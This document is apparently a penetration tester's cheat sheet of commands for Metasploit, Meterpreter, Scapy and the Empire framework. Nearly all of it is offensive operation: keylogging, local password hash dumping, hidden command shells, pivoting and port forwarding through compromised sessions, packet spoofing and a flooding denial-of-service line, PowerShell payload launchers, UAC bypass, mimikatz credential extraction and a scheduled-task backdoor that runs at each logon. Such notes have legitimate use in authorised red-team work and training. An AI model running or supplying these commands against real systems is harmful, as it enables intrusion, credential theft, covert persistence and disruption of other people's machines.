[+] MetaSpl0it

	-> enable rapid search:
		$ systemctl start postgresql
		$ msfdb init
		$ msfconsole
		msf > db_rebuild_cache
	
	-> load resource file:
		$ msfconsole -r file.rc

	-> list Windows exploits:
		$ msfcli | grep exploit/windows

	-> list available encoders:
		$ msfencode -l

	-> list available payloads:
		$ msfpayloads -h

	-> display exploits:
		$ show exploits

	-> display auxiliary modules:
		$ show auxiliary

	-> display payloads:
		$ show payloads

	-> search for a string:
		$ search <string>

	-> show module information:
		$ info <module>

	-> load exploit or module:
		$ use <module>

	-> displays module options:
		$ show options

	-> displays advanced options:
		$ show advanced

	-> sets a value:
		$ set <option> <value>

	-> list session (kill: -k nbr, upgrade: -u nbr):
		$ sessions -v

	-> run meterpreter script on all sessions:
		$ sessions -s script

	-> list all jobs:
		$ jobs -l

	-> run exploits as a job:
		$ exploit -j

	-> pivoting:
		$ route add <ip> <nmask> <session id>

	-> load 3rd party tree:
		$ loadpath /home/modules

	-> live Ruby interpreter shell:
		$ irb

	-> SSL connect:
		$ connect -s <ip> 443

	-> advanced option allows for multiple shells:
		$ exploit /multi/handler -> set ExitOnSession False

	-> enables logging:
		$ set ConsoleLogging true


[+] Meterpreter

	-> list available commands:
		$ help

	-> display system info:
		$ sysinfo

	-> list processes:
		$ ps

	-> list current PID:
		$ getpid

	-> upload a file:
		$ upload <file> C:\\Program\ Files\\

	-> download file:
		$ download <file>

	-> interact with registry:
		$ reg <cmd>

	-> revert to original user:
		$ rev2self

	-> drop to interactive shell:
		$ shell

	->  migrate to another PID:
		$ migrate <PID>

	-> background current session:
		$ background

	-> start/stop/dump keylogger:
		$ keyscan_(start|stop|dump)

	-> execute cmd.exe and interact:
		$ execute -f cmd.exe -i

	-> execute cmd.exe as hidden process and with all tokens
		$ execute -f cmd.exe -i -H -t

	-> dumps local hashes:
		$ hashdump

	-> executes script (/scripts/meterpreter)
		$ run <script>

	-> port forward 3389 through session (rdesktop to local port 443):
		$ portfwd [add|delete] -L 127.0.0.1 -l 443 -r 3.3.3.3 -p 3389



[+]	Scapy
	
	-> Spoofing:
		send(IP(src="192.168.1.1",dst="192.168.1.2")/ICMP()/"Hello World")
	-> Sniffing:
		sniff(iface="eth0", prn=lambda x:x.summary)
	-> DoS:
		send(IP(src="192.168.1.1", dst="192.168.1.2")/TCP(sport=80, dport=80), count=10000)


[+] Striker

	=> to scan websites


[+] Empire

	=> Workflow: listener -> payload -> agent -> privilege escalation -> persistence
	-> check the current active listeners:
		$ listeners
	-> use the http listener:
		$ uselistener http
	-> create powershell payload bind to the http listener (to execute on the target):
		$ launcher powershell http
	-> go to the previous window:
		$ back
	-> list the available agents (agent with an * is an admin account):
		$ agents
		$ list
	-> change the name of an agent:
		$ rename <old name> <new name>
	-> interact with an agent (high_integrity of 0 means no privs, of 1 means elevated privs):
		$ interact <agent name>
		$ info
	-> escalate privs with http listener (windows target):
		$ bypassuac http
	-> list the cleartext passwords and credentials:
		$ creds
	-> run the mimikatz module:
		$ mimikatz
	-> help commands:
		$ help
	-> an example of creating a backdoor (every time the user log-in):
		$ usemodule persistence/elevated/schtasks
		$ set OnLogon True
		$ set Listener http
		$ execute





